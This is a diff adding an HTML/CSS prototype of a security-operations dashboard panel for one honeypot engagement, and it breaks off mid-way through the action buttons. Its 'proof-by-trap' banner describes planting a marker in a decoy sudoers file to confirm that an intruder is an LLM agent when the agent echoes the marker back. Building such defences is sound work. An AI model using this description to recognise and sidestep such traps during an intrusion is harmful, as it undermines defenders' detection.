@@ -1,0 +1,1459 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Engagement 2b51584b · jdoe@10.0.0.14 — Plenith SOC</title>
+<style>
+  /* =====================================================================
+     PLENITH POPPED-OUT PANEL — v2 DESIGN PROTOTYPE
+     ---------------------------------------------------------------------
+     Standalone-window view of a single engagement, designed for a
+     dedicated monitor in a SOC.  In the functional implementation this
+     is what you get when you click the ↗ pop-out icon on the engagement-
+     detail panel of the main dashboard — the URL is /panel/engagement/<id>
+     and it subscribes to its own filtered SSE stream so updates flow
+     independently of the main dashboard.
+
+     Includes:
+       - Dark + Light themes (toggle in top-right). The light theme is
+         designed for office daylight + projector-shy execs; the dark
+         theme is for the SOC at 3 a.m.  Same density and information
+         hierarchy in both.
+       - TV mode toggle: hides the chrome, scales up, designed for a
+         wall display.  Apply to <body> as a class.
+       - Quick actions inline (acknowledge, kill, isolate, snapshot,
+         escalate) — this view turns the dashboard from "viewer" into
+         "incident-response surface."
+
+     Two short <script> blocks at the end handle the theme + TV-mode
+     toggle.  Otherwise vanilla HTML/CSS — same constraint as the main
+     mock.
+     ===================================================================== */
+
+  /* ----- Theme variables (dark default, .light overrides) ------------- */
+  :root {
+    --bg:         #0a0a0b;
+    --surface:    #131316;
+    --surface-2:  #1a1a1f;
+    --surface-3:  #232328;
+    --border:     #2a2a30;
+    --border-2:   #1f1f24;
+
+    --fg:         #f4f4f5;
+    --fg-2:       #a1a1aa;
+    --fg-3:       #71717a;
+    --fg-4:       #52525b;
+
+    --brand:      #fbbf24;
+    --brand-dim:  #92660d;
+
+    --sev-critical: #ef4444;
+    --sev-high:     #f97316;
+    --sev-medium:   #eab308;
+    --sev-low:      #3b82f6;
+    --sev-info:     #71717a;
+    --sev-ok:       #10b981;
+
+    --conf-low:   #3b82f6;
+    --conf-mid:   #eab308;
+    --conf-high:  #ef4444;
+
+    --shadow-card: 0 1px 3px rgba(0, 0, 0, 0.4);
+
+    /* Severity background tints — different between themes for contrast */
+    --tint-crit: rgba(239, 68, 68, 0.18);
+    --tint-high: rgba(249, 115, 22, 0.18);
+    --tint-med:  rgba(234, 179, 8, 0.18);
+    --tint-info: rgba(113, 113, 122, 0.18);
+    --tint-cmd-alert: rgba(239, 68, 68, 0.06);
+
+    --pad: 14px;
+    --gap: 14px;
+    --radius: 6px;
+
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", system-ui, sans-serif;
+    --mono: "JetBrains Mono", "Berkeley Mono", "SF Mono", ui-monospace, "Cascadia Mono", Consolas, monospace;
+  }
+
+  /* ----- LIGHT THEME ------------------------------------------------- */
+  body.light {
+    --bg:         #f8f8f9;
+    --surface:    #ffffff;
+    --surface-2:  #f4f4f5;
+    --surface-3:  #e4e4e7;
+    --border:     #d4d4d8;
+    --border-2:   #e4e4e7;
+
+    --fg:         #18181b;
+    --fg-2:       #52525b;
+    --fg-3:       #71717a;
+    --fg-4:       #a1a1aa;
+
+    --brand:      #d97706;        /* amber-600, more saturated for white bg */
+    --brand-dim:  #f59e0b;
+
+    --sev-critical: #dc2626;
+    --sev-high:     #ea580c;
+    --sev-medium:   #ca8a04;
+    --sev-low:      #2563eb;
+    --sev-info:     #71717a;
+    --sev-ok:       #059669;
+
+    --conf-low:   #2563eb;
+    --conf-mid:   #ca8a04;
+    --conf-high:  #dc2626;
+
+    --shadow-card: 0 1px 2px rgba(0, 0, 0, 0.04), 0 2px 8px rgba(0, 0, 0, 0.04);
+
+    /* Tints recalibrated for white surfaces */
+    --tint-crit: rgba(220, 38, 38, 0.10);
+    --tint-high: rgba(234, 88, 12, 0.10);
+    --tint-med:  rgba(202, 138, 4, 0.10);
+    --tint-info: rgba(113, 113, 122, 0.10);
+    --tint-cmd-alert: rgba(220, 38, 38, 0.05);
+  }
+
+  /* ----- Base ------------------------------------------------------- */
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  body {
+    background: var(--bg);
+    color: var(--fg);
+    font-family: var(--sans);
+    font-size: 13px;
+    line-height: 1.4;
+    min-height: 100vh;
+    transition: background 0.15s ease, color 0.15s ease;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+  }
+  .mono { font-family: var(--mono); }
+  .dim  { color: var(--fg-3); }
+  .dim2 { color: var(--fg-4); }
+  .num  { font-family: var(--mono); font-variant-numeric: tabular-nums; }
+
+  /* ----- TV mode (full-screen wall display) ------------------------- */
+  body.tv .chrome    { display: none; }
+  body.tv .container { max-width: none; padding: 28px 48px; }
+  body.tv            { font-size: 16px; }
+  body.tv .gauge-val { font-size: 56px; }
+  body.tv .pop-eid   { font-size: 22px; }
+  body.tv .cmd       { font-size: 14.5px; }
+
+  /* =================================================================
+     CHROME — minimal top bar
+     ================================================================= */
+  .chrome {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 10px 18px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border-2);
+    transition: background 0.15s ease, border-color 0.15s ease;
+  }
+  .chrome-left {
+    display: flex; align-items: center; gap: 14px;
+    font-family: var(--mono); font-size: 12px;
+    color: var(--fg-2);
+  }
+  .chrome-left .back {
+    color: var(--fg-2); text-decoration: none;
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 4px 9px;
+    border-radius: 4px;
+    transition: background 0.1s ease, color 0.1s ease;
+  }
+  .chrome-left .back:hover { background: var(--surface-2); color: var(--fg); }
+  .chrome-left .crumb-sep { color: var(--fg-4); }
+  .chrome-left .eid-short {
+    color: var(--fg); font-family: var(--mono); font-weight: 500;
+  }
+  .chrome-right {
+    display: flex; align-items: center; gap: 6px;
+  }
+  .chrome-btn {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 5px 10px;
+    border-radius: 4px;
+    background: var(--surface);
+    border: 1px solid var(--border-2);
+    color: var(--fg-2);
+    font-family: var(--mono);
+    font-size: 11px;
+    cursor: pointer;
+    transition: all 0.1s ease;
+    user-select: none;
+  }
+  .chrome-btn:hover {
+    background: var(--surface-2);
+    color: var(--fg);
+    border-color: var(--border);
+  }
+  .chrome-btn.active {
+    background: rgba(251, 191, 36, 0.10);
+    color: var(--brand);
+    border-color: var(--brand-dim);
+  }
+  body.light .chrome-btn.active {
+    background: rgba(217, 119, 6, 0.08);
+  }
+  .chrome-btn .ico { font-size: 12px; line-height: 1; }
+
+  /* =================================================================
+     CONTAINER — main content
+     ================================================================= */
+  .container {
+    max-width: 1180px;
+    margin: 0 auto;
+    padding: 20px 24px;
+    display: flex; flex-direction: column;
+    gap: 16px;
+  }
+
+  /* ----- Engagement header ------------------------------------------ */
+  .pop-header {
+    display: flex; align-items: flex-start; justify-content: space-between;
+    gap: 24px;
+  }
+  .pop-header-left {
+    display: flex; flex-direction: column; gap: 6px;
+  }
+  .pop-id-row {
+    display: flex; align-items: center; gap: 10px;
+    font-family: var(--mono);
+  }
+  .pop-sev {
+    padding: 3px 8px;
+    border-radius: 3px;
+    font-family: var(--mono); font-size: 11px; font-weight: 600;
+    letter-spacing: 0.06em;
+    background: var(--sev-critical); color: white;
+  }
+  .pop-eid {
+    font-size: 18px; color: var(--fg);
+  }
+  .pop-status-pill {
+    display: inline-flex; align-items: center; gap: 5px;
+    padding: 3px 8px;
+    background: var(--tint-crit);
+    color: var(--sev-critical);
+    border-radius: 3px;
+    font-family: var(--mono); font-size: 11px;
+    font-weight: 500;
+  }
+  .pop-status-pill .pulse {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--sev-critical);
+    animation: pulse-red 1.4s infinite;
+  }
+  @keyframes pulse-red {
+    0%, 100% { opacity: 1; }
+    50%      { opacity: 0.45; }
+  }
+  .pop-who {
+    font-family: var(--mono); font-size: 22px;
+    color: var(--fg);
+    letter-spacing: -0.01em;
+  }
+  .pop-meta {
+    display: flex; flex-wrap: wrap; gap: 4px 18px;
+    font-family: var(--mono); font-size: 12px;
+    color: var(--fg-3);
+  }
+  .pop-meta .k {
+    color: var(--fg-4);
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    margin-right: 4px;
+  }
+  .pop-meta .v { color: var(--fg-2); }
+
+  /* ----- Quick actions ---------------------------------------------- */
+  .actions-grid {
+    display: flex; flex-wrap: wrap; gap: 6px;
+    justify-content: flex-end;
+  }
+  .action-btn {
+    display: inline-flex; align-items: center; gap: 6px;
+    padding: 7px 13px;
+    border-radius: 4px;
+    background: var(--surface);
+    border: 1px solid var(--border-2);
+    color: var(--fg);
+    font-family: var(--mono);
+    font-size: 11.5px;
+    cursor: pointer;
+    transition: all 0.1s ease;
+    user-select: none;
+  }
+  .action-btn:hover {
+    background: var(--surface-2);
+    border-color: var(--border);
+  }
+  .action-btn.primary {
+    background: var(--brand);
+    color: #1a1106;
+    border-color: var(--brand);
+    font-weight: 500;
+  }
+  body.light .action-btn.primary { color: white; }
+  .action-btn.primary:hover {
+    filter: brightness(1.08);
+  }
+  .action-btn.danger {
+    color: var(--sev-critical);
+    border-color: rgba(239, 68, 68, 0.3);
+  }
+  .action-btn.danger:hover {
+    background: var(--tint-crit);
+    border-color: var(--sev-critical);
+  }
+  .action-btn .ico { font-size: 11px; line-height: 1; }
+  .action-btn .kbd {
+    margin-left: 4px;
+    padding: 0 4px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+    border-radius: 2px;
+    font-size: 9px;
+    color: var(--fg-3);
+  }
+  body.light .action-btn.primary .kbd {
+    background: rgba(255,255,255,0.2);
+    color: rgba(255,255,255,0.9);
+    border-color: rgba(255,255,255,0.25);
+  }
+
+  /* ----- Cards/Panels ---------------------------------------------- */
+  .card {
+    background: var(--surface);
+    border: 1px solid var(--border-2);
+    border-radius: var(--radius);
+    box-shadow: var(--shadow-card);
+    overflow: hidden;
+  }
+  .card-head {
+    padding: 10px 14px;
+    border-bottom: 1px solid var(--border-2);
+    display: flex; align-items: center; justify-content: space-between;
+    font-size: 11px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--fg-3);
+    font-weight: 500;
+  }
+  .card-head .count {
+    font-family: var(--mono);
+    color: var(--fg);
+    background: var(--surface-2);
+    padding: 2px 7px;
+    border-radius: 3px;
+    font-size: 11px;
+    letter-spacing: 0;
+  }
+
+  /* ----- Grid layouts ---------------------------------------------- */
+  .top-row {
+    display: grid;
+    grid-template-columns: 1.05fr 1.5fr;
+    gap: var(--gap);
+  }
+  .bottom-row {
+    display: grid;
+    grid-template-columns: 1.5fr 1fr;
+    gap: var(--gap);
+  }
+
+  /* ----- Counter-AI card (oversized for popout) -------------------- */
+  .counter-ai-body {
+    padding: 18px;
+  }
+  .gauge-row {
+    display: grid;
+    grid-template-columns: 170px 1fr;
+    gap: 18px;
+    align-items: center;
+    margin-bottom: 16px;
+  }
+  .gauge-big { position: relative; width: 170px; height: 170px; }
+  .gauge-big svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+  .gauge-center {
+    position: absolute; inset: 0;
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    font-family: var(--mono);
+  }
+  .gauge-val { font-size: 38px; font-weight: 500; color: var(--fg); line-height: 1; }
+  .gauge-label {
+    font-size: 9px; letter-spacing: 0.18em; text-transform: uppercase;
+    color: var(--fg-3); margin-top: 6px;
+  }
+  .gauge-trend {
+    margin-top: 4px;
+    font-size: 10px;
+    color: var(--sev-critical);
+    font-family: var(--mono);
+  }
+  .signals-big {
+    display: flex; flex-direction: column; gap: 9px;
+  }
+  .signal-big {
+    display: grid; grid-template-columns: 78px 1fr 50px;
+    gap: 12px; align-items: center;
+  }
+  .signal-big-name {
+    font-size: 10px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--fg-2);
+    font-weight: 500;
+  }
+  .signal-big-bar {
+    height: 8px;
+    background: var(--surface-2);
+    border-radius: 4px;
+    position: relative; overflow: hidden;
+  }
+  .signal-big-fill {
+    position: absolute; left: 0; top: 0; bottom: 0;
+    border-radius: 4px;
+  }
+  .signal-big-fill.timing { background: linear-gradient(90deg, #6366f1, #818cf8); }
+  .signal-big-fill.lex    { background: linear-gradient(90deg, #8b5cf6, #a78bfa); }
+  .signal-big-fill.inj    { background: linear-gradient(90deg, #ec4899, #f472b6); }
+  .signal-big-val {
+    font-family: var(--mono); font-size: 13px;
+    color: var(--fg);
+    text-align: right;
+    font-variant-numeric: tabular-nums;
+  }
+  .gate-row {
+    display: grid; grid-template-columns: 1fr 1fr;
+    gap: 6px;
+    margin-top: 14px;
+    padding-top: 14px;
+    border-top: 1px dashed var(--border-2);
+  }
+  .gate-card {
+    padding: 8px 10px;
+    border-radius: 4px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+  }
+  .gate-card.fired {
+    background: var(--tint-crit);
+    border-color: rgba(239, 68, 68, 0.3);
+  }
+  .gate-card .gate-name {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 0.12em;
+    text-transform: uppercase;
+    color: var(--fg-3);
+  }
+  .gate-card.fired .gate-name { color: var(--sev-critical); }
+  .gate-card .gate-status {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--fg);
+    margin-top: 2px;
+    display: flex; align-items: baseline; gap: 6px;
+  }
+  .gate-card .gate-thresh {
+    font-size: 10px; color: var(--fg-4);
+  }
+
+  /* ----- Alerts card ------------------------------------------------ */
+  .alerts-grid {
+    padding: 8px;
+    display: flex; flex-direction: column; gap: 4px;
+  }
+  .alert-row {
+    display: grid;
+    grid-template-columns: 50px 1fr auto;
+    gap: 10px; align-items: center;
+    padding: 8px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background 0.08s ease;
+  }
+  .alert-row:hover { background: var(--surface-2); }
+  .alert-row .sev {
+    padding: 2px 6px;
+    border-radius: 2px;
+    font-family: var(--mono);
+    font-size: 9px;
+    font-weight: 600;
+    text-align: center;
+    letter-spacing: 0.06em;
+  }
+  .alert-row .sev.crit { background: var(--sev-critical); color: white; }
+  .alert-row .sev.high { background: var(--sev-high); color: white; }
+  body.light .alert-row .sev.high { color: white; }
+  .alert-row .sev.med  { background: var(--sev-medium); color: white; }
+  body.light .alert-row .sev.med  { color: white; }
+  .alert-row .body {
+    display: flex; flex-direction: column;
+    gap: 2px; overflow: hidden;
+  }
+  .alert-row .name {
+    font-family: var(--mono);
+    font-size: 12.5px;
+    color: var(--fg);
+  }
+  .alert-row .trigger {
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--fg-3);
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .alert-row .ts {
+    font-family: var(--mono); font-size: 10px;
+    color: var(--fg-4);
+    align-self: start;
+  }
+
+  /* ----- Command timeline ------------------------------------------ */
+  .timeline {
+    padding: 6px 14px 14px;
+  }
+  .cmd {
+    display: grid;
+    grid-template-columns: 70px 86px 1fr 30px;
+    gap: 12px;
+    padding: 4px 0;
+    font-family: var(--mono); font-size: 12px;
+    line-height: 1.5;
+    align-items: center;
+  }
+  .cmd-ts { color: var(--fg-4); font-size: 11px; }
+  .cmd-src {
+    color: var(--fg-3);
+    font-size: 10px;
+    padding: 1px 5px; border-radius: 2px;
+    background: var(--surface-2);
+    text-align: center;
+  }
+  .cmd-src.cache    { color: #2563eb; background: rgba(59, 130, 246, 0.10); }
+  body:not(.light) .cmd-src.cache    { color: #93c5fd; }
+  .cmd-src.vfs      { color: #059669; background: rgba(16, 185, 129, 0.10); }
+  body:not(.light) .cmd-src.vfs      { color: #6ee7b7; }
+  .cmd-src.sim-bot  { color: #7c3aed; background: rgba(139, 92, 246, 0.10); }
+  body:not(.light) .cmd-src.sim-bot  { color: #c4b5fd; }
+  .cmd-src.llm      { color: #c026d3; background: rgba(217, 70, 239, 0.10); }
+  body:not(.light) .cmd-src.llm      { color: #f0abfc; }
+  .cmd-src.find     { color: #ea580c; background: rgba(249, 115, 22, 0.10); }
+  body:not(.light) .cmd-src.find     { color: #fdba74; }
+  .cmd-src.alert    {
+    color: var(--sev-critical);
+    background: var(--tint-crit);
+    font-weight: 600;
+  }
+  .cmd-text {
+    color: var(--fg);
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .cmd.alerted {
+    background: var(--tint-cmd-alert);
+    margin: 0 -14px;
+    padding-left: 14px; padding-right: 14px;
+    border-left: 2px solid var(--sev-critical);
+  }
+  .cmd-zoom {
+    color: var(--fg-4);
+    cursor: pointer;
+    text-align: center;
+    font-size: 14px;
+    line-height: 1;
+    opacity: 0;
+    transition: opacity 0.1s ease;
+  }
+  .cmd:hover .cmd-zoom { opacity: 1; }
+  .cmd-zoom:hover { color: var(--brand); }
+
+  /* ----- Filesystem diff ------------------------------------------- */
+  .diff-grid {
+    padding: 10px 14px 14px;
+    font-family: var(--mono); font-size: 12px;
+  }
+  .diff-row {
+    display: grid;
+    grid-template-columns: 16px 1fr auto;
+    gap: 8px;
+    padding: 3px 0;
+    align-items: baseline;
+    border-bottom: 1px dashed var(--border-2);
+  }
+  .diff-row:last-child { border-bottom: none; }
+  .diff-mark {
+    font-weight: 700;
+    text-align: center;
+  }
+  .diff-mark.add { color: var(--sev-ok); }
+  .diff-mark.mod { color: var(--sev-medium); }
+  .diff-mark.del { color: var(--sev-critical); }
+  .diff-mark.honeytok { color: var(--sev-critical); }
+  .diff-path {
+    color: var(--fg);
+    overflow: hidden;
+    text-overflow: ellipsis;
+    white-space: nowrap;
+  }
+  .diff-meta {
+    color: var(--fg-4);
+    font-size: 11px;
+  }
+  .diff-row.honeytok .diff-path::after {
+    content: " · honeytoken";
+    color: var(--sev-critical);
+    font-weight: 500;
+  }
+
+  /* =================================================================
+     NEW: Proof-by-trap callout banner — only renders when the
+     `attacker_llm_proven_via_trap` flag is set on the engagement.
+     Highest-priority piece of information in the entire view: it's
+     the only signal Plenith can produce that is incontrovertible
+     evidence the attacker is an LLM agent.  Goes ABOVE the engagement
+     header so it's the first thing the eye lands on.
+     ================================================================= */
+  .proof-banner {
+    background: linear-gradient(90deg,
+      rgba(220, 38, 38, 0.18) 0%,
+      rgba(220, 38, 38, 0.08) 60%,
+      rgba(220, 38, 38, 0.04) 100%);
+    border: 1px solid rgba(220, 38, 38, 0.35);
+    border-radius: var(--radius);
+    padding: 14px 18px;
+    display: grid;
+    grid-template-columns: auto 1fr auto;
+    gap: 18px;
+    align-items: center;
+  }
+  body.light .proof-banner {
+    background: linear-gradient(90deg,
+      rgba(220, 38, 38, 0.10) 0%,
+      rgba(220, 38, 38, 0.04) 60%,
+      rgba(220, 38, 38, 0.02) 100%);
+    border-color: rgba(220, 38, 38, 0.25);
+  }
+  .proof-icon {
+    width: 38px; height: 38px;
+    border: 1.5px solid var(--sev-critical);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    background: rgba(220, 38, 38, 0.10);
+    animation: proof-pulse 2.4s infinite;
+    flex-shrink: 0;
+  }
+  .proof-icon svg { width: 18px; height: 18px; color: var(--sev-critical); }
+  @keyframes proof-pulse {
+    0%, 100% { box-shadow: 0 0 0 0 rgba(220, 38, 38, 0.35); }
+    50%      { box-shadow: 0 0 0 10px rgba(220, 38, 38, 0); }
+  }
+  .proof-text {
+    display: flex; flex-direction: column; gap: 2px;
+  }
+  .proof-title {
+    font-family: var(--mono);
+    font-size: 14px;
+    color: var(--sev-critical);
+    font-weight: 600;
+    letter-spacing: 0.02em;
+  }
+  .proof-detail {
+    font-family: var(--mono);
+    font-size: 12px;
+    color: var(--fg-2);
+  }
+  .proof-detail .marker {
+    color: var(--fg);
+    font-weight: 500;
+    background: var(--surface-2);
+    padding: 1px 6px;
+    border-radius: 2px;
+  }
+  .proof-meta {
+    text-align: right;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--fg-3);
+  }
+  .proof-meta .ts { color: var(--fg); }
+
+  /* =================================================================
+     NEW: Rich-text-output-markdown note editor.  The toolbar inserts
+     markdown syntax around selections (B → **bold**, I → *italic*).
+     Operators see WYSIWYG-ish results in the preview tab; output is
+     markdown so it diffs cleanly in git and renders consistently in
+     the static audit/IoC exports.
+     ================================================================= */
+  .note-editor {
+    padding: 12px 14px 14px;
+  }
+  .editor-tabs {
+    display: flex; gap: 4px;
+    border-bottom: 1px solid var(--border-2);
+    margin-bottom: 8px;
+  }
+  .editor-tab {
+    padding: 6px 12px;
+    font-family: var(--mono);
+    font-size: 11px;
+    color: var(--fg-3);
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    margin-bottom: -1px;
+    transition: color 0.1s ease;
+  }
+  .editor-tab:hover { color: var(--fg-2); }
+  .editor-tab.active {
+    color: var(--fg);
+    border-bottom-color: var(--brand);
+  }
+  .editor-toolbar {
+    display: flex;
+    gap: 2px;
+    padding: 4px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+    border-radius: 4px 4px 0 0;
+    border-bottom: none;
+  }
+  .editor-tool {
+    width: 26px; height: 26px;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 3px;
+    color: var(--fg-3);
+    cursor: pointer;
+    font-family: var(--mono);
+    font-size: 12px;
+    font-weight: 500;
+    transition: all 0.1s ease;
+    user-select: none;
+  }
+  .editor-tool:hover {
+    background: var(--surface-3);
+    color: var(--fg);
+  }
+  .editor-tool.bold       { font-weight: 700; }
+  .editor-tool.italic     { font-style: italic; }
+  .editor-tool.strike     { text-decoration: line-through; }
+  .editor-tool.code       { font-family: var(--mono); }
+  .editor-tool .ico { font-size: 11px; }
+  .editor-divider {
+    width: 1px; background: var(--border-2); margin: 4px 4px;
+  }
+  .editor-textarea {
+    width: 100%;
+    min-height: 100px;
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+    border-top: none;
+    border-radius: 0 0 4px 4px;
+    padding: 10px 12px;
+    color: var(--fg);
+    font-family: var(--mono);
+    font-size: 12.5px;
+    line-height: 1.55;
+    resize: vertical;
+    outline: none;
+  }
+  .editor-textarea:focus { border-color: var(--brand-dim); }
+  .editor-preview {
+    background: var(--surface-2);
+    border: 1px solid var(--border-2);
+    border-radius: 4px;
+    padding: 14px;
+    font-size: 13px;
+    line-height: 1.55;
+    color: var(--fg);
+    min-height: 100px;
+  }
+  .editor-preview p { margin: 0 0 8px; }
+  .editor-preview p:last-child { margin-bottom: 0; }
+  .editor-preview code {
+    font-family: var(--mono);
+    background: var(--surface-3);
+    padding: 1px 5px;
+    border-radius: 2px;
+    font-size: 12px;
+  }
+  .editor-preview strong { color: var(--fg); }
+  .editor-preview em { color: var(--fg-2); }
+  .editor-preview .mention { color: var(--brand); font-weight: 500; }
+  .editor-footer {
+    display: flex; justify-content: space-between; align-items: center;
+    margin-top: 8px;
+    font-size: 11px;
+    color: var(--fg-3);
+    font-family: var(--mono);
+  }
+  .editor-footer .hint {
+    color: var(--fg-4);
+  }
+  .editor-save {
+    padding: 5px 12px;
+    background: var(--brand);
+    color: #1a1106;
+    border: none;
+    border-radius: 3px;
+    font-family: var(--mono);
+    font-size: 11px;
+    font-weight: 500;
+    cursor: pointer;
+  }
+  body.light .editor-save { color: white; }
+  .editor-save:hover { filter: brightness(1.08); }
+
+  /* Existing notes list */
+  .notes-list {
+    border-bottom: 1px solid var(--border-2);
+  }
+  .note-item {
+    padding: 10px 14px;
+    border-bottom: 1px dashed var(--border-2);
+    font-size: 12.5px;
+    line-height: 1.5;
+  }
+  .note-item:last-child { border-bottom: none; }
+  .note-header {
+    display: flex; align-items: center; gap: 8px;
+    margin-bottom: 4px;
+    font-family: var(--mono); font-size: 10.5px;
+    color: var(--fg-3);
+  }
+  .note-author {
+    color: var(--fg);
+    font-weight: 500;
+  }
+  .note-ts { color: var(--fg-4); }
+  .note-body { color: var(--fg-2); }
+  .note-body code {
+    font-family: var(--mono);
+    background: var(--surface-2);
+    padding: 1px 5px;
+    border-radius: 2px;
+    font-size: 11.5px;
+  }
+
+  /* =================================================================
+     NEW: Quick-action interaction patterns.
+       - Primary (Acknowledge, Snapshot): single click + success toast
+       - Reversible (Escalate, Isolate): click + inline 10s undo
+       - Destructive (Kill session): hold-to-confirm (1 sec)
+     ================================================================= */
+
+  /* Hold-to-confirm wrapper — fills with red as user holds.
+     CSS-only demo of the visual; real behavior wired in script tag. */
+  .action-btn.danger {
+    position: relative;
+    overflow: hidden;
+  }
+  .action-btn.danger .hold-fill {
+    position: absolute; inset: 0;
+    background: var(--sev-critical);
+    transform-origin: left;
+    transform: scaleX(0);
+    transition: transform 1s linear;
+    opacity: 0.85;
+    pointer-events: none;
+  }
+  .action-btn.danger:hover { color: white; border-color: var(--sev-critical); }
+  .action-btn.danger:active .hold-fill { transform: scaleX(1); }
+  .action-btn.danger > * { position: relative; z-index: 1; }
+  .action-btn .hold-hint {
+    font-size: 9px;
+    color: var(--fg-4);
+    margin-left: 6px;
+    letter-spacing: 0.05em;
+  }
+  .action-btn.danger:hover .hold-hint { color: rgba(255, 255, 255, 0.7); }
+
+  /* ----- Footer ---------------------------------------------------- */
+  .footer {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 12px 24px 18px;
+    font-family: var(--mono); font-size: 11px;
+    color: var(--fg-4);
+  }
+  .footer a {
+    color: var(--fg-3);
+    text-decoration: none;
+  }
+  .footer a:hover { color: var(--fg); }
+  .footer .sep { color: var(--fg-4); margin: 0 6px; }
+  .footer .pulse-dot {
+    display: inline-block; width: 6px; height: 6px; border-radius: 50%;
+    background: var(--sev-ok);
+    box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6);
+    animation: pulse 2s infinite;
+    margin-right: 6px;
+  }
+  @keyframes pulse {
+    0%   { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.6); }
+    70%  { box-shadow: 0 0 0 6px rgba(16, 185, 129, 0); }
+    100% { box-shadow: 0 0 0 0 rgba(16, 185, 129, 0); }
+  }
+</style>
+</head>
+<body>
+
+<!-- ================================================================ -->
+<!-- CHROME — minimal top bar with theme + TV toggles                  -->
+<!-- ================================================================ -->
+<div class="chrome">
+  <div class="chrome-left">
+    <a href="dashboard-prototype.html" class="back">
+      <svg width="11" height="11" viewBox="0 0 12 12" fill="none" stroke="currentColor" stroke-width="1.6">
+        <path d="M7.5 2L3.5 6L7.5 10"/>
+      </svg>
+      Dashboard
+    </a>
+    <span class="crumb-sep">/</span>
+    <span>engagement</span>
+    <span class="crumb-sep">/</span>
+    <span class="eid-short">2b51584b</span>
+  </div>
+  <div class="chrome-right">
+    <span class="chrome-btn" id="theme-toggle" title="Switch between dark and light themes">
+      <span class="ico" id="theme-ico">☾</span>
+      <span id="theme-name">Dark</span>
+    </span>
+    <span class="chrome-btn" id="tv-toggle" title="TV mode — hides chrome, scales up for wall display">
+      <span class="ico">▣</span> TV mode
+    </span>
+    <span class="chrome-btn" title="Subscribe to browser notifications for this engagement">
+      <span class="ico">◉</span> Notify
+    </span>
+    <span class="chrome-btn" title="Close window">
+      <span class="ico">×</span>
+    </span>
+  </div>
+</div>
+
+<!-- ================================================================ -->
+<!-- CONTAINER                                                          -->
+<!-- ================================================================ -->
+<div class="container">
+
+  <!-- ============================================================== -->
+  <!-- PROOF-BY-TRAP CALLOUT — the highest-priority piece of info       -->
+  <!-- in the entire view, hence the top placement.  Only renders when  -->
+  <!-- `attacker_llm_proven_via_trap` is true; quiet engagements don't  -->
+  <!-- show this banner.                                                -->
+  <!-- ============================================================== -->
+  <div class="proof-banner">
+    <div class="proof-icon">
+      <svg viewBox="0 0 18 18" fill="none" stroke="currentColor" stroke-width="2"
+            stroke-linecap="round" stroke-linejoin="round">
+        <path d="M9 1 L11.2 6.5 L17 7 L12.5 11 L14 17 L9 13.8 L4 17 L5.5 11 L1 7 L6.8 6.5 Z"/>
+      </svg>
+    </div>
+    <div class="proof-text">
+      <div class="proof-title">PROOF-BY-TRAP — attacker LLM consumption confirmed</div>
+      <div class="proof-detail">
+        Trap marker <span class="marker">MC7A3F2D</span> planted at <span class="mono">14:25:23</span> in
+        <span class="mono">/etc/sudoers.d/zzz_compat</span>, echoed back at <span class="mono">14:27:12</span>
+        in the attacker's command stream. Counter-AI escalated to "proven LLM."
+      </div>
+    </div>
+    <div class="proof-meta">
+      <div>1m 49s lag plant → echo</div>
+      <div class="ts">first this month</div>
+    </div>
+  </div>
+
+  <!-- HEADER: engagement identity + actions ------------------------- -->
+  <div class="pop-header">
+    <div class="pop-header-left">
+      <div class="pop-id-row">
+        <span class="pop-sev">CRIT</span>
+        <span class="pop-eid">2b51584b-9014-4719-be4d-c9f56b9199ad</span>
+        <span class="pop-status-pill">
+          <span class="pulse"></span> active — last cmd 12s ago
+        </span>
+      </div>
+      <div class="pop-who">jdoe@10.0.0.14</div>
+      <div class="pop-meta">
+        <span><span class="k">DECOY</span><span class="v">bastion-prod</span></span>
+        <span><span class="k">REDIRECTED-TO</span><span class="v">api-prod-03</span></span>
+        <span><span class="k">FIRST SEEN</span><span class="v">2026-05-14 14:23:41 UTC</span></span>
+        <span><span class="k">DWELL</span><span class="v">4m 22s</span></span>
+        <span><span class="k">CONNECTIONS</span><span class="v">6</span></span>
+        <span><span class="k">COMMANDS</span><span class="v">19</span></span>
+      </div>
+    </div>
+    <div class="actions-grid">
+      <button class="action-btn primary">
+        <span class="ico">✓</span> Acknowledge <span class="kbd">A</span>
+      </button>
+      <button class="action-btn">
+        <span class="ico">📋</span> Snapshot <span class="kbd">S</span>
+      </button>
+      <button class="action-btn">
+        <span class="ico">⌫</span> Isolate
+      </button>
+      <button class="action-btn">
+        <span class="ico">↗</span> Escalate L2
+      </button>
+      <button class="action-btn danger" title="Hold for 1 second to confirm — prevents accidental session kill while keeping speed-to-kill fast for active intrusions">
+        <span class="hold-fill"></span>
+        <span class="ico">⏹</span> Kill session
